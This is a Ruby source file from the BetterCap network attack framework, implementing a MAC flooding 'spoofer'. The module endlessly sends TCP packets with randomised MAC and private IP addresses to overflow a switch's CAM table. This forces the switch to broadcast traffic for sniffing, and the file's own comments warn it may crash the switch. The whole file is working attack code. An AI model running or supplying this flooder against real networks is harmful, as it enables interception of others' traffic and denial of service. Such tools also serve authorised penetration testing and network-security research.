# encoding: UTF-8
=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : https://www.evilsocket.net/

MAC spoofer:
  Author : Brendan Coles
  Email  : bcoles[at]gmail.com

This project is released under the GPL 3 license.

=end

module BetterCap
module Spoofers
#
# This class is responsible for performing MAC address flooding on the network.
#
# This spoofer continuously floods the network with empty TCP
# packets with randomised source and destination MAC addresses
# to fill the switch's Content Addressable Memory (CAM) table.
#
# If the network switch is vulnerable, no new MAC addresses
# will be learned, causing the switch to fail open and broadcast
# traffic out on all ports.
#
# This spoofer does not facilitate Man-in-the-Middle attacks,
# however, if successful, will allow the sniffer to view packets
# destined for any network port on the switch.
#
# Note: this spoofer may crash the switch,
#       resulting in denial of service.
#
# References:
# - https://en.wikipedia.org/wiki/MAC_flooding
# - https://en.wikipedia.org/wiki/Forwarding_information_base
# - http://www.ciscopress.com/articles/article.asp?p=1681033&seqNum=2
#
class MAC < Base
  # Initialize the BetterCap::Spoofers::MAC object.
  def initialize
    @ctx          = Context.get
    @flood_thread = nil
    @running      = false

    update_gateway!
  end

  # Start the MAC spoofing
  def start
    Logger.debug 'Starting MAC spoofer ...'

    stop() if @running
    @running = true

    @flood_thread = Thread.new { mac_flood }
  end

  # Stop the MAC spoofing
  def stop
    raise 'MAC spoofer is not running' unless @running

    Logger.debug 'Stopping MAC spoofer ...'

    @running = false
    begin
      @flood_thread.exit
    rescue
    end
  end

  private

  # Main spoofer loop
  def mac_flood
    while true
      send_tcp_pkt rand_rfc1918_ip, rand_mac, rand_rfc1918_ip, rand_mac
    end
  end

  # Generate a random MAC address
  def rand_mac
    [format('%0.2x', rand(256) & ~1), (1..5).map { format('%0.2x', rand(256)) }].join(':')
  end

  # Generate a random RFC1918 IP address
  def rand_rfc1918_ip
    case rand(3)
    when 0
      ip = ['10', (0...256).to_a.sample, (0...256).to_a.sample, (1...256).to_a.sample]
    when 1
      ip = ['172', (16...32).to_a.sample, (0...256).to_a.sample, (1...256).to_a.sample]
    when 2
      ip = ['192', '168', (0...256).to_a.sample, (1...256).to_a.sample]
    end
    ip.join('.')
  end

  # Generate a random port above 1024
  def rand_port
    (rand((2 ** 16) - 1024) + 1024).to_i
  end

  # Send an empty TCP packet from +saddr+ IP address to +daddr+ IP address
  # with +smac+ source MAC address and +dmac+ destination MAC address.
  def send_tcp_pkt(saddr, smac, daddr, dmac)
    pkt = PacketFu::TCPPacket.new
    pkt.eth_saddr = smac
    pkt.eth_daddr = dmac

    pkt.ip_saddr = saddr
    pkt.ip_daddr = daddr
    pkt.ip_recalc

    pkt.tcp_src = rand_port
    pkt.tcp_dst = rand_port

    @ctx.packets.push(pkt)
  end
end
end
end
